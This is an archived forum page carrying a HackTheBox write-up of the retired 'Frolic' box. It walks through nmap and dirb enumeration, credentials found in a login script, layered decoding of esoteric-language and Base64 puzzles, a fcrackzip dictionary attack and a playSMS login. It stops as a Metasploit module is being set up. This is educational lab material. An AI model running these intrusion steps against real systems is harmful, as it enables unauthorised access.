<!DOCTYPE html>
<html lang="en">
  <!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<head>
    <meta charset="utf-8">
    <title>HackTheBox Writeup: Frolic - Hackthebox Writeups - 0x00sec - The Home of the Hacker</title>
    <meta name="description" content="Hello nullers, today I‚Äôm bringing you the writeup of a very interesting CTF challenge that has just been retired from HackTheBox: Frolic. Despite this box being rated as ‚ÄúEasy‚Äù it‚Äôs one of those challenges that can eas&amp;hellip;">
    <meta name="generator" content="Discourse 3.6.0.beta2-latest - https://github.com/discourse/discourse version 3b1964f3ed8bdc2f181e2abccb1b116e4b814db5">
<link rel="icon" type="image/png" href="../../uploads/default/optimized/2X/3/30c4e7d76acf879a124fdfe4d8d126afe628c189_2_32x32.html">
<link rel="apple-touch-icon" type="image/png" href="../../uploads/default/optimized/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e_2_180x180.html">
<meta name="theme-color" media="all" content="#171616">

<meta name="color-scheme" content="dark">

<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, viewport-fit=cover">
<link rel="canonical" href="12478.html" />

<link rel="search" type="application/opensearchdescription+xml" href="../../opensearch.xml" title="0x00sec - The Home of the Hacker Search">

    
    <link href="../../stylesheets/color_definitions_0x00sec-v2_15_57_dfa17f5b2e0faf8b274cd749dd7dab92384218d4.css_%3b%20filename_%3dUTF-8%27%27color_definitions_0x00sec-v2_15_57_dfa17f5b2e0faf8b274cd749dd7dab92384218d4a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" class="light-scheme" data-scheme-id="15"/>

<link href="../../stylesheets/common_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27common_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="common"  />

  <link href="../../stylesheets/mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="mobile"  />
  <link href="../../stylesheets/desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="desktop"  />



    <link href="../../stylesheets/chat_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="chat"  />
    <link href="../../stylesheets/checklist_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27checklist_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="checklist"  />
    <link href="../../stylesheets/discourse-cakeday_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-cakeday_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-cakeday"  />
    <link href="../../stylesheets/discourse-details_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-details_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-details"  />
    <link href="../../stylesheets/discourse-lazy-videos_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-lazy-videos_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-lazy-videos"  />
    <link href="../../stylesheets/discourse-local-dates_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-local-dates_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-local-dates"  />
    <link href="../../stylesheets/discourse-narrative-bot_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-narrative-bot_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-narrative-bot"  />
    <link href="../../stylesheets/discourse-presence_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-presence_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-presence"  />
    <link href="../../stylesheets/discourse-solved_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-solved_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-solved"  />
    <link href="../../stylesheets/discourse-templates_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-templates_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-templates"  />
    <link href="../../stylesheets/discourse-topic-voting_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-topic-voting"  />
    <link href="../../stylesheets/docker_manager_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27docker_manager_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="docker_manager"  />
    <link href="../../stylesheets/footnote_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27footnote_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="footnote"  />
    <link href="../../stylesheets/poll_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27poll_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="poll"  />
    <link href="../../stylesheets/spoiler-alert_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27spoiler-alert_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="spoiler-alert"  />
    <link href="../../stylesheets/chat_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="chat_mobile"  />
    <link href="../../stylesheets/discourse-solved_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-solved_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="discourse-solved_mobile"  />
    <link href="../../stylesheets/discourse-topic-voting_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="discourse-topic-voting_mobile"  />
    <link href="../../stylesheets/chat_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="chat_desktop"  />
    <link href="../../stylesheets/discourse-topic-voting_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="discourse-topic-voting_desktop"  />
    <link href="../../stylesheets/poll_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27poll_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="poll_desktop"  />

  <link href="../../stylesheets/common_theme_57_2b2f1b92f8727e7da2866f327e36ad944c6960db.css_%3b%20filename_%3dUTF-8%27%27common_theme_57_2b2f1b92f8727e7da2866f327e36ad944c6960dba97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="common_theme" data-theme-id="57" data-theme-name="0x00sec-v2"/>
    <link href="../../stylesheets/mobile_theme_4_7b59060f894813801912cfad9deff99ebb9e9a38.css_%3b%20filename_%3dUTF-8%27%27mobile_theme_4_7b59060f894813801912cfad9deff99ebb9e9a38a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="mobile_theme" data-theme-id="4" data-theme-name="mobile chrome"/>
    <link href="../../stylesheets/desktop_theme_46_ae6f300d6e65399f845f6707524095726ad69a96.css_%3b%20filename_%3dUTF-8%27%27desktop_theme_46_ae6f300d6e65399f845f6707524095726ad69a96a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="desktop_theme" data-theme-id="46" data-theme-name="header links v2"/>

    <link rel="stylesheet" href="../../../external.html?link=https://s3.amazonaws.com/0x00sec/monokai-sublime.css">
<script src="../../../external.html?link=https://s3.amazonaws.com/0x00sec/highlight.pack.js" nonce="YSiX4FhfwzZuN3KVdXoanMAJY"></script>
<script defer="" src="../../theme-javascripts/05954ff525aceb8daa8b585f92d758d311ae7077.js_%3b%20filename_%3dUTF-8%27%2705954ff525aceb8daa8b585f92d758d311ae7077a97f.js?__ws=d.clarkee.co.uk" data-theme-id="40" nonce="YSiX4FhfwzZuN3KVdXoanMAJY"></script>
    
        <link rel="alternate nofollow" type="application/rss+xml" title="RSS feed of &#39;HackTheBox Writeup: Frolic&#39;" href="12478.rss" />
    <meta property="og:site_name" content="0x00sec - The Home of the Hacker" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:image" content="https://0x00sec.s3.amazonaws.com/original/2X/1/1f9ea27e1adefdbb29e984d3bdd363ecee346c9d.png" />
<meta property="og:image" content="https://0x00sec.s3.amazonaws.com/original/2X/1/1f9ea27e1adefdbb29e984d3bdd363ecee346c9d.png" />
<meta property="og:url" content="https://d.clarkee.co.uk/t/hackthebox-writeup-frolic/12478" />
<meta name="twitter:url" content="https://d.clarkee.co.uk/t/hackthebox-writeup-frolic/12478" />
<meta property="og:title" content="HackTheBox Writeup: Frolic" />
<meta name="twitter:title" content="HackTheBox Writeup: Frolic" />
<meta property="og:description" content="Hello nullers, today I‚Äôm bringing you the writeup of a very interesting CTF challenge that has just been retired from HackTheBox: Frolic. Despite this box being rated as ‚ÄúEasy‚Äù it‚Äôs one of those challenges that can easily become frustrating because of rabbit holes, weird messages, and overall not-so-realistic aspects that can be downright confusing, but after all this we get to exploit a very fun and sort of realistic buffer overflow vulnerability through a ret2libc attack that allows us to le..." />
<meta name="twitter:description" content="Hello nullers, today I‚Äôm bringing you the writeup of a very interesting CTF challenge that has just been retired from HackTheBox: Frolic. Despite this box being rated as ‚ÄúEasy‚Äù it‚Äôs one of those challenges that can easily become frustrating because of rabbit holes, weird messages, and overall not-so-realistic aspects that can be downright confusing, but after all this we get to exploit a very fun and sort of realistic buffer overflow vulnerability through a ret2libc attack that allows us to le..." />
<meta property="og:article:section" content="CTF" />
<meta property="og:article:section:color" content="F1592A" />
<meta property="og:article:section" content="Hackthebox Writeups" />
<meta property="og:article:section:color" content="3AB54A" />
<meta name="twitter:label1" value="Reading time" />
<meta name="twitter:data1" value="10 mins üïë" />
<meta name="twitter:label2" value="Likes" />
<meta name="twitter:data2" value="15 ‚ù§" />
<meta property="article:published_time" content="2019-03-23T15:33:12+00:00" />
<meta property="og:ignore_canonical" content="true" />


    
  </head>
  <body class="crawler ">
    <div id="top-navbar" class="container">
<span id="top-navbar-links" style="display:none;">
  <!--<a href="https://git.0x00sec.org" class="dow-menu">GitLab</a>  
  <a href="https://blog.0x00sec.org/irc" class="dow-menu">IRC</a>!-->
  <a href="../../../external.html?link=https://init.0x00sec.org/" class="dow-menu">Init</a>
  <a href="../../../external.html?link=https://discord.gg/c6BHVfn" class="dow-menu">Discord</a>
  <a href="../../../external.html?link=https://init.0x00sec.org/?partners" class="dow-menu">Partners</a>
</span>
</div>
    <header>
  <a href="../../index.html">0x00sec - The Home of the Hacker</a>
</header>

    <div id="main-outlet" class="wrap" role="main">
        <div id="topic-title">
    <h1>
      <a href="12478.html">HackTheBox Writeup: Frolic</a>
    </h1>

      <div class="topic-category" itemscope itemtype="../../../external.html?link=http://schema.org/BreadcrumbList">
          <span itemprop="itemListElement" itemscope itemtype="../../../external.html?link=http://schema.org/ListItem">
            <a href="../../c/ctf/55.html" class="badge-wrapper bullet" itemprop="item">
              <span class='badge-category-bg' style='background-color: #F1592A'></span>
              <span class='badge-category clear-badge'>
                <span class='category-name' itemprop='name'>CTF</span>
              </span>
            </a>
            <meta itemprop="position" content="1" />
          </span>
          <span itemprop="itemListElement" itemscope itemtype="../../../external.html?link=http://schema.org/ListItem">
            <a href="../../c/ctf/htb-writeups/103.html" class="badge-wrapper bullet" itemprop="item">
              <span class='badge-category-bg' style='background-color: #3AB54A'></span>
              <span class='badge-category clear-badge'>
                <span class='category-name' itemprop='name'>Hackthebox Writeups</span>
              </span>
            </a>
            <meta itemprop="position" content="2" />
          </span>
      </div>

  </div>

  

    <div itemscope itemtype='../../../external.html?link=http://schema.org/DiscussionForumPosting'>
      <meta itemprop='headline' content='HackTheBox Writeup: Frolic'>
      <link itemprop='url' href='12478.html'>
      <meta itemprop='datePublished' content='2019-03-23T15:33:11Z'>
        <meta itemprop='articleSection' content='Hackthebox Writeups'>
      <meta itemprop='keywords' content=''>
      <div itemprop='publisher' itemscope itemtype="../../../external.html?link=http://schema.org/Organization">
        <meta itemprop='name' content='0x00sec - The Home of the Hacker'>
          <div itemprop='logo' itemscope itemtype="../../../external.html?link=http://schema.org/ImageObject">
            <meta itemprop='url' content='../../uploads/default/original/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e.html'>
          </div>
      </div>


          <div id='post_1'  class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/Baud.html'><span itemprop='name'>Baud</span></a>
                
              </span>

                <link itemprop="mainEntityOfPage" href="12478.html">

                <link itemprop="image" href="../../../0x00sec.s3.amazonaws.com/original/2X/1/1f9ea27e1adefdbb29e984d3bdd363ecee346c9d.png">

              <span class="crawler-post-infos">
                  <time  datetime='2019-03-23T15:33:12Z' class='post-time'>
                    March 23, 2019,  3:33pm
                  </time>
                  <meta itemprop='dateModified' content='2019-03-23T15:33:12Z'>
              <span itemprop='position'>1</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/1/1f9ea27e1adefdbb29e984d3bdd363ecee346c9d.png" alt="image" data-base62-sha1="4vIFQt3RHeHCftrXjG4fqOQy6n3" width="312" height="91"></p>
<p>Hello nullers, today I‚Äôm bringing you the writeup of a very interesting CTF challenge that has just been retired from HackTheBox: Frolic. Despite this box being rated as ‚ÄúEasy‚Äù it‚Äôs one of those challenges that can easily become frustrating because of rabbit holes, weird messages, and overall not-so-realistic aspects that can be downright confusing, but after all this we get to exploit a very fun and sort of realistic buffer overflow vulnerability through a ret2libc attack that allows us to leverage our permissions and become root on the system, so I‚Äôd say it‚Äôs a great box to learn new things regarding exploit writing and it can also teach a few tricks that can be used on other CTF-y and less realistic boxes, so all experience is good.</p>
<p>I‚Äôm also going to explain some theory regarding the buffer overflow attack we are going to launch, so don‚Äôt worry if you never wrote one yourself before, although you might find that part boring if you‚Äôre already a good stack smasher. But enough with the talking and let‚Äôs start hacking. Actually‚Ä¶ before we do that, let‚Äôs start enumerating!</p>
<p><strong>Drawing  the perimeter:</strong></p>
<p>When I first approach a new box I like to scan every possible port with masscan and then pass the results to nmap to enumerate the discovered services more deeply, but in this case a standard nmap scan returns all the results we need so let‚Äôs not overcomplicate things from the start, here is the command I typically use:</p>
<pre><code>nmap -sS -sV -sC 10.10.10.111
</code></pre>
<p>If you‚Äôre not familiar with nmap flags:</p>
<ul>
<li>-sS will run a TCP SYN scan, which is faster and stealthier than a full open port scan</li>
<li>-sV will attempt to enumerate name and version of the services running behind the discovered ports</li>
<li>-sC will execute a few useful selected NSE scripts against the target to tell us a bit more about services like HTTP, SMB, SSH, and more. It can find some valuable information, and in this phase we must discover as much as possible about the target</li>
</ul>
<p>The output reveals some interesting ports:</p>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/b/b609525363724202a5b97e51e6b1b6c00f9aa0de.png" alt="image" data-base62-sha1="pYmS0dIfQJtvvVdSLiTCxqf1OSq" width="583" height="500"></p>
<p>We have SSH, SMB, and even an nginx web server running on port 9999, which is very unusual. If we wanted we could list available SMB shares with smbclient like this:</p>
<pre><code>smbclient -L 10.10.10.111
</code></pre>
<p>But we would only see default shares that cannot be accessed with a NULL session, so we have to look elsewhere. What about that suspicious looking nginx server? What is it hiding?</p>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/0/03f4f9ff9c5ad6d086a5c1d00b6c27c13ca833fc.png" alt="image" data-base62-sha1="z0i7suw0brlgMd1m3Dif4xxMNm" width="626" height="228"></p>
<p>Well‚Ä¶ nothing apparently, the source code doesn‚Äôt even contain comments or links to useful resources, this looks like a normal default configuration of nginx. But it isn‚Äôt just that, not even in the slightest. We can find out why by firing up our favorite web content discovery tool, I use dirb with the default common.txt dictionary it comes with, it works well for most occasions:</p>
<pre><code>dirb http://10.10.10.111:9999/ -R
</code></pre>
<p>By default dirb will scan content recursively, so whenever it finds a new folder it will start iterating through the entire dictionary inside the new folder in the hope of finding more files or sub-directories, but this can result in some very noisy and useless output we don‚Äôt need, for example when a directory containing a manual in multiple languages is found, so the -R flag tells dirb to ask us if we want to enter a new directory and start a new scan, this way we can only make it scan the directories we are interested in and not waste any time. Anyway it turns out the server is actually hiding something:</p>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/7/7e017e962bd0d646d80a8fc24c016acb548c2ea1.png" alt="image" data-base62-sha1="hYHmw4ES3pnSzpYLqjE8Q4c06Cl" width="623" height="455"></p>
<p>I‚Äôm going to start from the bottom. The /test/ directory just takes us to a phpinfo() output, the only interesting things we can spot between all this output are the versions of PHP and Ubuntu, so now we know what OS Frolic uses and what version too:</p>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/0/0540736fac72d6f41ef972e859544794376a583c.png" alt="image" data-base62-sha1="KstjvCOuCzsCzOcwAmoumd2kXy" width="690" height="174"></p>
<p>/dev/ on the other hand is much more intriguing, because it just shows us a 403 Forbidden code. We‚Äôll come back here later.<br>
/backup/ shows what pretends to be a directory listing:</p>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/5/5436c76b11e059d8ca221dbda09f03474b062f0a.png" alt="image" data-base62-sha1="c0ZtchaULvvcFZ13rb6fespxb7A" width="234" height="33"></p>
<p>In fact password.txt and user.txt (no, it‚Äôs not the flag) are actual files inside this /backup/ folder, which we can open to reveal a pair of credentials:</p>
<pre><code>user - admin
password - imnothuman
</code></pre>
<p>The loop/ folder is just a folder that‚Ä¶ loops. Yeah. Rabbit hole, just ignore and move on. The only place where we could use these so far is SSH, but they won‚Äôt work. Time to keep examining our dirb output. The last directory we haven‚Äôt checked yet is /admin/, where interestingly we find a very enticing login form:</p>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/3/3e26680ae1862bcaf76e18d14abce751a6a52ef2.png" alt="image" data-base62-sha1="8RNT5wH7MaUqmRcDHKeQxUjNxv4" width="407" height="363"></p>
<p>And no, our credentials don‚Äôt work here either, but instead of showing off our bruteforcing and SQL injection skills we can just take a calm look at the source code of this page to find something juicy to say the least:</p>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/3/3030c3e13176e29f93cd45ed1dff8a55681a55fe.png" alt="image" data-base62-sha1="6SjoDM422Ug7O0h8Pq69NZ6JFpQ" width="551" height="403"></p>
<p>A JavaScript file is being included in this page from /admin/js/, and things get even more interesting once we open the script (I made it more readable because the lack of proper spacing really bothered me):</p>
<pre><code class="lang-auto">var attempt = 3; // Variable to count number of attempts.
// Below function Executes on click of login button.

function validate()
{
    var username = document.getElementById("username").value;
    var password = document.getElementById("password").value;

    if ( username == "admin" &amp;&amp; password == "superduperlooperpassword_lol")
    {

        alert("Login successfully");
        window.location = "success.html"; // Redirecting to other page.
        return false;
    }

    else
    {
        attempt--;// Decrementing by one.
        alert("You have left " + attempt + " attempt");
        // Disabling fields after 3 attempts.

        if( attempt == 0)
        {
            document.getElementById("username").disabled = true;
            document.getElementById("password").disabled = true;
            document.getElementById("submit").disabled = true;
            return false;
        }
    }
}
</code></pre>
<p>The script itself gave us the credentials we need to login!</p>
<pre><code>User: admin
Pass: superduperlooperpassword_lol
</code></pre>
<p>So let‚Äôs see what we find behind this admin ‚Äúportal‚Äù: we are redirected to a page called success.html and all we can see is this:</p>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/7/7b6cc22f731d6ca23207feb232af265b65d6cd39.png" alt="image" data-base62-sha1="hBRK3V00ztfzdrq3jfzyyHyBpYR" width="690" height="83"></p>
<p>Looks pretty weird, and definitely not humanly readable. This is probably the worst part of the entire challenge because what we have here is the source code of a program written in a dialect of an uncommon esoteric programming language (and by "dialect" I mean "shorter version of the language"). Esoteric languages are not created to be used efficiently, rather they try to be as unique, confusing, or weird as possible, mostly just for a laugh. This one in particular is called Ook! and luckily we can find an <a href="../../../external.html?link=https://www.dcode.fr/ook-language" rel="noopener nofollow ugc">online interpreter</a> where to paste the source code and get its output:</p>
<pre><code>Nothing here check /asdiSIAJJ0QWE9JAS
</code></pre>
<p>We decide to listen to that suggestion and we go to 10.10.10.111:9999/asdiSIAJJ0QWE9JAS where in fact we find something:</p>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/0/05bceef7f00df4dabcb72c2b7bf58538cad3aefe.png" alt="image" data-base62-sha1="OLaSpNfFr45mSKKDPHrt1oTS34" width="690" height="75"></p>
<p>Good, more nonsense. But this one is actually much easier to guess, if you‚Äôve seen a few Base64 strings you‚Äôll have recognized it, its alphabet and pattern are pretty unique. However if you paste this long string on a decoder that only shows ASCII outputs you will receive an error, because this is not a Base64 encoded string, it‚Äôs Base64 encoded binary data! So we need to decode this string into a file, we can do it from terminal:</p>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/c/cedf5c99fdcdb5d828ea403d6c8f89a0f929f225.png" alt="image" data-base62-sha1="tw4UmXYDeLMt1Rrab7XviGm4iod" width="645" height="103"></p>
<p>In the first step I opened nano, a CLI text editor, and pasted the Base64 string after removing all the blank characters (if you leave them in you won‚Äôt be able to decode the string). Then I used the base64 utility to decode the content of the file where I saved the string, redirecting the output to a new file which revealed itself as a compressed archive. However there is one tiny issue‚Ä¶ it‚Äôs password protected:</p>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/d/dc5db59ff54cf4c1c5bc99cd89ddeb51c5b69d99.png" alt="image" data-base62-sha1="vrrOxj7o8wlr1c4Qqm14q7oYj0d" width="319" height="61"></p>
<p>Fear not though, the issue really is tiny for a reason‚Ä¶ the password is just ‚Äúpassword‚Äù, it‚Äôs easily guessable. But because we are discussing password protected Zip archives I‚Äôm still going to show a <a href="../../../external.html?link=https://github.com/hyc/fcrackzip" rel="noopener nofollow ugc">neat tool</a> to launch a dictionary attack against archives that may have a somewhat less stupid password. Example usage:</p>
<pre><code>fcrackzip -D -p ../rockyou.txt -u frolic_out
</code></pre>
<p>Anyway now that we can unzip the file we can see the content of index.php, the only file we could find in the archive, which in reality is just a normal text file disguising itself as a PHP page:</p>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/a/a889c7fd5c1f6a2da423111a867e803f03c5525d.png" alt="image" data-base62-sha1="o2XppIq2nK6RYohZvbAkLKf4CRv" width="690" height="202"></p>
<p>That is clearly a hexadecimal string, when we run into these strings the way to make them readable is almost every time to convert them into ASCII, as we can guess this was just a normal string of which every character has been rewritten as its hexadecimal value. A random online converter like <a href="../../../external.html?link=https://www.asciitohex.com/" rel="noopener nofollow ugc">this</a> will do the job. This is what we get:</p>
<pre><code>KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKy4tLS0gLS0uKysgKysrKysgLjwrKysgWy0+KysgKzxdPisKKysuPCsgKytbLT4gLS0tPF0gPi0tLS0gLS0uLS0gLS0tLS0gLjwrKysgK1stPisgKysrPF0gPisrKy4gPCsrK1sgLT4tLS0KPF0+LS0gLjwrKysgWy0+KysgKzxdPisgLi0tLS4gPCsrK1sgLT4tLS0gPF0+LS0gLS0tLS4gPCsrKysgWy0+KysgKys8XT4KKysuLjwgCg==
</code></pre>
<p>Oh look, another Base64 string! Will we ever get anywhere with this? Decode this one too:</p>
<pre><code>+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++++ +.--- --.++ +++++ .&lt;+++ [-&gt;++ +&lt;]&gt;+
++.&lt;+ ++[-&gt; ---&lt;] &gt;---- --.-- ----- .&lt;+++ +[-&gt;+ +++&lt;] &gt;+++. &lt;+++[ -&gt;---
&lt;]&gt;-- .&lt;+++ [-&gt;++ +&lt;]&gt;+ .---. &lt;+++[ -&gt;--- &lt;]&gt;-- ----. &lt;++++ [-&gt;++ ++&lt;]&gt;
++..&lt;
</code></pre>
<p>And this looks a little more cryptic. If you‚Äôve already dug deep enough in the realm of esoteric programming languages you might have recognized this already, it‚Äôs a BrainFuck program. So just like with Ook! we can look for an <a href="../../../external.html?link=https://copy.sh/brainfuck/" rel="noopener nofollow ugc">online interpreter</a> where to paste and execute this code, which gives us as output:</p>
<pre><code>idkwhatispass
</code></pre>
<p>So we went through all this trouble only for a string that we don‚Äôt know where to use and what it represents. Well to be fair it‚Äôs pretty easy to guess it could be a password, so we‚Äôll go with that. But where can we use it? It still doesn‚Äôt work on SSH, so we‚Äôre still missing something. But not really, we just left it behind for later. Remember that /dev/ folder, the one that we couldn‚Äôt access because of the Forbidden HTTP message? We didn‚Äôt try running a dirb scan in there, I wonder if we can find something‚Ä¶</p>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/2/22b18f9fb4ccef4fe7e616efda0029750424fb28.png" alt="image" data-base62-sha1="4WUEIxFPzTP6ZPkSgTk51PbLvNS" width="551" height="83"></p>
<p>We did find indeed. The file called ‚Äútest‚Äù is literally just a text file with ‚Äútest‚Äù written on it, nothing interesting. However that /backup/ folder‚Ä¶</p>
<pre><code>/playsms
</code></pre>
<p>We are presented with this, a name for another folder. So if we connect to <a href="../../../external.html?link=http://10.10.10.111:9999/playsms:" rel="noopener nofollow ugc">http://10.10.10.111:9999/playsms:</a></p>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/9/917892858f3e369d6de1e83ab908c9341cd49771.png" alt="image" data-base62-sha1="kKTyC2QB7jMo3XvxcuATzyWd2WB" width="319" height="300"></p>
<p>We find a whole web application! Now we can finally test our credentials, and it turns out that ‚Äúimnothuman‚Äù password is completely useless, while the ‚Äúadmin‚Äù username from user.txt and the ‚Äúidkwhatispass‚Äù password from the BrainFuck program grant us access to the application:</p>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/a/a1f32018cc117213fecd4e6303dc6397f3ce8ea6.png" alt="image" data-base62-sha1="n6FLwhCIwEMDmpMNKpjrmbmqOUu" width="614" height="225"></p>
<p>The first thing I do when I login on a new web application is look for version numbers, useful features, and command injection vulnerabilities, but usually looking for public exploits before doing anything else is a good habit. Let‚Äôs see if metasploit has any modules to attack playSMS in its database:</p>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/d/d56c594c8997fa86ad8131ffba1fec682fbce09b.png" alt="image" data-base62-sha1="us1PVjujret742hwuX30UxKMqoz" width="690" height="109"></p>
<p>We found two, and even if they were released on the same day to target the same versions I have only found the second module to work against the box. As we can see from the description this exploit requires authentication so even if we found the application earlier we couldn‚Äôt exploit it until now.</p>
<p><strong>First exploitation, getting user:</strong></p>
<p>The module of our choice is very straightforward, I highlighted the options that need to be changed:</p>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/f/fc5b5f3165fe1af7fbd06918765f6720e6c351c7.png" alt="image" data-base62-sha1="A0s5jWy7HAAPqqkrrHMc9Wl7dmD" width="690" height="300"></p>
